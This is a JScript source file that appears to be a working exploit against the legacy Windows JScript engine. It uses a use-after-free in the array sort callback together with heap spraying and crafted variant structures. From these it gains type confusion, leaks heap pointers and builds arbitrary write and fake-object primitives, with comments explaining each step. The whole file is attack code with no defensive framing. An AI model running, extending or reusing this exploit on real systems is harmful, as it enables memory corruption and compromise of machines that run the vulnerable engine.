var variants;
var padding_for_hash = "AAAAAAAAAAA";

var OBJ_FOR_ARBITRARY_READS_AND_WRITES
var PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED = "A";
var INDEX_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC = -1;
var VALUE_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_DYNAMIC = -1;

var size = 20000
var depth = 0;
var overlay;
var overlay_backup;
var spray;
var typeConfusionedIndices = "";
var typeConfusionedArray = new Array()
var leak_lower;
var leak_verify_var;
var write_index = 0;

function isInt(n){
    return Number(n) === n && n % 1 === 0;
}

function isFloat(n){
    return Number(n) === n && n % 1 !== 0;
}

function makeVariant(type, obj_ptr_lower, obj_ptr_upper, next_ptr_lower, next_ptr_upper) { // Make a variant
    var charCodes = new Array();
    charCodes.push(
         // type
        type, 0, 0, 0,

         // obj_ptr
        obj_ptr_lower & 0xffff, (obj_ptr_lower >> 16) & 0xffff, obj_ptr_upper & 0xffff, (obj_ptr_upper >> 16) & 0xffff,

        // next_ptr
        next_ptr_lower & 0xffff, (next_ptr_lower >> 16) & 0xffff, next_ptr_upper & 0xffff, (next_ptr_upper >> 16) & 0xffff
        );
    return String.fromCharCode.apply(null, charCodes);
}

function set_variants(type, obj_ptr_lower, obj_ptr_upper, next_ptr_lower, next_ptr_upper) {
    variants = "AAAAAAAA";
    for(i=0; i < 46; i++) {
        variants += makeVariant(type, obj_ptr_lower, obj_ptr_upper, next_ptr_lower, next_ptr_upper);
    }
    variants += "AAAAAAAAA";
}

function createVariantForFloatTypeConfusionByAddingAFloatVar() {
    variants = "AAAAAAAA"; // 1 unicode char is 41 00 which is 2 bytes, 2 x 8 = 16 // Start with 16 bytes of padding to correctly align (Each string character is UTF-16)
    while(variants.length < 0x230) {
        variants += makeVariant(0x0003, 1234, 0x00000000, 0x00000000, 0x00000000);     // Generate a number of variants with type 3 (int) and the value 1234
    }
    variants += "\u0005";
}

function createVariantForFloatTypeConfusionByCreatingAVval() {
    variants = new Array(570).join('A') // exactly 0x239 bytes long
}

function legacyResetFunction() {
    overlay = new Array(); // Will be used to create VVAL structures
    for(var i=0; i < size; i++) overlay[i] = new Object(); // can use Array/Object
    spray = new Array();
    for(var i=0; i < size; i++) spray[i] = new Object();
}

function reset() {
    depth = 0;
    spray = new Array();
    overlay = new Array();
    total = new Array();
    typeConfusionedArray = new Array();
    typeConfusionedIndices = "";
    for(i = 0; i < size; i++) overlay[i] = new Object(); // Overlay must happen before spray
    for(i = 0; i < size; i++) spray[i] = new Object();
    CollectGarbage();
}

function uaf_type_confusion_exploit(untracked_1, untracked_2) {
    if(depth == 100) {
        for(var i=0; i < size; i++) spray[i] = 0;
        CollectGarbage();
        for(var i=0; i < size; i++) {
            overlay[i][variants] = 1;
            overlay[i]["AAAAAAAAAAA"] = 1;    // Required in order to align the untracked variable
            overlay[i]["\u0005"] = 1;   // The hash-manipulating value.

            // first step: obtain pointers to BSTR VAR
            // our untracked variable will point to this FLOAT VAR whose obj_ptr points to our "A" VVAL/VAR structure (address to "A" VVAL/VAR structure)
            // hence, address to "A" VAR will be leaked (e.g. 0x12345678)

            // second step: read value stored at 0x12345678, as 0x12345678's points to i
            // We can then create BSTR VARs whose obj_ptr set to 0x12345678
            // Hence we will read whatever 0x12345678 is pointing to

            overlay[i][PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED] = i; // The next property that will get leaked.
        }
    } else {
        untracked_1 = spray[depth*2];
        untracked_2 = spray[depth*2 + 1];
        var tempDepth = depth
        depth += 1;
        [0,0].sort(uaf_type_confusion_exploit);
        /**/   
        if(typeof untracked_1 === "number") { 
            var tempArray = new Array()
            tempArray[0] = tempDepth
            tempArray[1] = untracked_1
            typeConfusionedArray.push(tempArray)
        }
        if(typeof untracked_2 === "number") { 
            var tempArray = new Array()
            tempArray[0] = tempDepth
            tempArray[1] = untracked_2
            typeConfusionedArray.push(tempArray)
        }  
        if(typeof untracked_1 === "number" || typeof untracked_2 === "number") { 
            typeConfusionedIndices += tempDepth.toString() ; 
            typeConfusionedIndices += " " 
        }
        /**/
        /*
        typeConfusionedArray.push(untracked_1)
        typeConfusionedArray.push(untracked_2) 
        */
    }
    return 4;
}

function get_var_obj_ptr_to_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_via_float_type_confusion() {
    /**/
    for (var i = 0; i < typeConfusionedArray.length; i++) {
        var temp = typeConfusionedArray[i][1]
        if(typeof temp === "number") { 
            if (isFloat(temp)) {
                var leak = (temp / 4.9406564584124654E-324); // VVAL *next pointer i guess?
                leak_lower =  leak
                WScript.Echo("We have sprayed 0x5 type floats and type confused one of the variables. *next pointer to PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED value is: 0x" + leak.toString(16)) 
            }
        } 
    }
    //WScript.Echo("Out of n pairs of variables, the following have been successfully type confused: " + typeConfusionedIndices)
    /**/
    /*
    for (var i = 0; i < typeConfusionedArray.length; i++) {
        if(typeof typeConfusionedArray[i] === "number" && typeConfusionedArray[i] % 1 != 0) {
            leak_lower = (typeConfusionedArray[i] / 4.9406564584124654E-324); // This division just converts the float into an easy-to-read 32-bit number
            WScript.Echo(leak_lower.toString(16))
            break;
        } 
    }
    */
}

function get_index_to_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC_via_bstr_var_type_confusion_obj_pointer() {
    /**/
    for (var i = 0; i < typeConfusionedArray.length; i++) {
        var temp = typeConfusionedArray[i][1]
        if(typeof temp === "number") { 
            INDEX_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC = parseInt(temp + ""); // temp is from typeConfusionedArray[i][1] which is dynamic. By running parseInt, we make the value static
            VALUE_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_DYNAMIC = temp;
            break
        }
    }
    //WScript.Echo("Out of n pairs of variables, the following have been successfully type confused: " + typeConfusionedIndices)
    /**/
    /*
    for (var i = 0; i < typeConfusionedArray.length; i++) {
        if(typeof typeConfusionedArray[i] === "number") {
            leak_offset = parseInt(typeConfusionedArray[i] + "");
            leak_verify_var = typeConfusionedArray[i];
            break;
        } 
    }
    */
}

// Spray is to allocate GcBlocks to be freed later (0x970)
// Overlay is to allocate after GcBlocks are freed
// Any value which points to Spray should end up pointing to Overlay
// Values from typeConfusionedArray are from Spray
// rewrite baiscally gives us the power to write to the value of the BSTR property name to which we have an address to
// VALUE_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED is derived from typeConfusionedArray which is derived from spray which is derived from overlay
// hence changing the overlay should change the VALUE_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED
function write_controlled_VVAL_structure(property_name_value, write_value){
    CollectGarbage(); // Get rid of anything that still needs to be freed before starting
    overlay_backup[INDEX_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC] = null; // Remove the reference to target object
    CollectGarbage(); // Free the object
    set_variants(0x80, leak_lower);
    overlay_backup[INDEX_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC] = new Object(); // New object - Should end up in the same slot as the last object
    overlay_backup[INDEX_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC][variants] = 1; // Reallocate the newly freed location
    overlay_backup[INDEX_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC]["AAAAAAAAAAA"] = 1; // Perform the padding again
    overlay_backup[INDEX_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC]["\u0006"] = 1; // Create the leak var again - this does not matter as long as its 1 unicode, we are creating a write primative
    overlay_backup[INDEX_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC][property_name_value] = write_value; // Reallocate over the area with a new property name and a new VAR assigned. This name will be at a known location since the address of this VVAL is already known
}

function test_write_controlled_VVAL_structure(val) {
    write_controlled_VVAL_structure("this_does_not_really_matter_for_now", val);
    if(VALUE_TO_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_DYNAMIC+"" != val) {
        throw Error("Couldn't re-write variable");
    }
    WScript.Echo("test_write(val) function works")
}

function get_obj_through_the_name_of_the_last_VVAL_structure_via_int_type_confusion_obj_pointer(value) {
    for (var i = 0; i < typeConfusionedArray.length; i++) {
        var temp = typeConfusionedArray[i][1]
        if(typeof temp === "number") { 
            if(temp + "" == value) {
                obj = temp;
                break;
            }
            break
        }
    }
}

function test_obj(value) {
    write_controlled_VVAL_structure(makeVariant(3, value));
    if(obj + "" != value) { // Turning it to a string causes the conversion to copy, dereferencing the 0x80 type. Type 0x80 being used directly won't work.
        throw Error("Couldn't re-write fakeobj variable");
    }
    WScript.Echo("test_obj(val) function works")
}

function main() {
    //legacyResetFunction();
    reset();

    //createVariantForFloatTypeConfusionByAddingAFloatVar();
    createVariantForFloatTypeConfusionByCreatingAVval(); 
    [0,0].sort(uaf_type_confusion_exploit);
    get_var_obj_ptr_to_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_via_float_type_confusion();
    
    overlay_backup = overlay
    reset(); 
    set_variants(0x80, leak_lower); // this guy points to "A" which stores index, when you hit a "number" which is actually a bstr string
    [1,1].sort(uaf_type_confusion_exploit);
    get_index_to_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC_via_bstr_var_type_confusion_obj_pointer()
    test_write_controlled_VVAL_structure(50)
    var initial_obj_value = 1234
    write_controlled_VVAL_structure(makeVariant(3, initial_obj_value)); // set last property name to a int VAR 

    reset();
    set_variants(0x80, leak_lower + 64); // point to the name string of last VVAL structure
    [0,0].sort(uaf_type_confusion_exploit); 
    get_obj_through_the_name_of_the_last_VVAL_structure_via_int_type_confusion_obj_pointer(initial_obj_value)
    test_obj(initial_obj_value)
}

main()